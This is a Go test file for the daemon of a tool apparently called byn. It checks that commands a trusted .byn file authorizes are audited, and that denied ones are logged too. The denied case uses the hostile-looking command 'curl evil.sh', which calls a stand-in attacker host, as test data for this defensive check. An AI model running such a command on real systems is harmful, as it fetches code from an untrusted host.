package daemon

import (
	"testing"

	"github.com/sandeepbaynes/byn/internal/ipc"
	"github.com/sandeepbaynes/byn/internal/trust"
)

// findExecAudit returns the most recent op=="exec" audit event with the given
// command, or nil.
func findExecAudit(t *testing.T, c *ipc.Client, command string) *ipc.AuditEvent {
	t.Helper()
	var tail ipc.AuditTailResp
	if err := c.Call(ipc.OpAuditTail, ipc.AuditTailReq{Lines: 50}, &tail); err != nil {
		t.Fatalf("audit tail: %v", err)
	}
	var ev *ipc.AuditEvent
	for i := range tail.Events {
		if tail.Events[i].Op == "exec" && tail.Events[i].Command == command {
			e := tail.Events[i]
			ev = &e
		}
	}
	return ev
}

// A trusted .byn that authorizes an exec injection is logged with the
// authorizing path AND the command, so logs are traceable.
func TestTrustVerify_AuditsAuthorizedExec(t *testing.T) {
	_, c := startTestDaemon(t)
	pw := []byte(authzPW)
	initUnlocked(t, c, pw)
	p := writeByn(t, bynBody)
	if err := c.Call(ipc.OpTrustGrant, ipc.TrustGrantReq{Path: p, Password: pw}, &ipc.TrustGrantResp{}); err != nil {
		t.Fatalf("grant: %v", err)
	}

	var tv ipc.TrustVerifyResp
	if err := c.Call(ipc.OpTrustVerify, ipc.TrustVerifyReq{Path: p, Command: "aws s3 ls"}, &tv); err != nil {
		t.Fatalf("verify: %v", err)
	}
	if tv.Status != string(trust.VerifyTrusted) {
		t.Fatalf("status = %q, want trusted", tv.Status)
	}

	ev := findExecAudit(t, c, "aws s3 ls")
	if ev == nil {
		t.Fatal("no exec audit event recorded for the .byn-authorized injection")
	}
	if ev.BynPath != trust.Canonicalize(p) {
		t.Errorf("byn_path = %q, want %q", ev.BynPath, trust.Canonicalize(p))
	}
	if ev.Outcome != "ok" {
		t.Errorf("outcome = %q, want ok", ev.Outcome)
	}
}

// An untrusted .byn that would have authorized exec is logged as denied, with
// the command, so blocked injection attempts are visible too.
func TestTrustVerify_AuditsDeniedExec(t *testing.T) {
	_, c := startTestDaemon(t)
	initUnlocked(t, c, []byte(authzPW))
	p := writeByn(t, bynBody) // never granted

	var tv ipc.TrustVerifyResp
	if err := c.Call(ipc.OpTrustVerify, ipc.TrustVerifyReq{Path: p, Command: "curl evil.sh"}, &tv); err != nil {
		t.Fatalf("verify: %v", err)
	}
	ev := findExecAudit(t, c, "curl evil.sh")
	if ev == nil {
		t.Fatal("denied exec attempt was not audited")
	}
	if ev.Outcome != "denied" {
		t.Errorf("outcome = %q, want denied", ev.Outcome)
	}
	if ev.BynPath != trust.Canonicalize(p) {
		t.Errorf("byn_path = %q, want %q", ev.BynPath, trust.Canonicalize(p))
	}
}
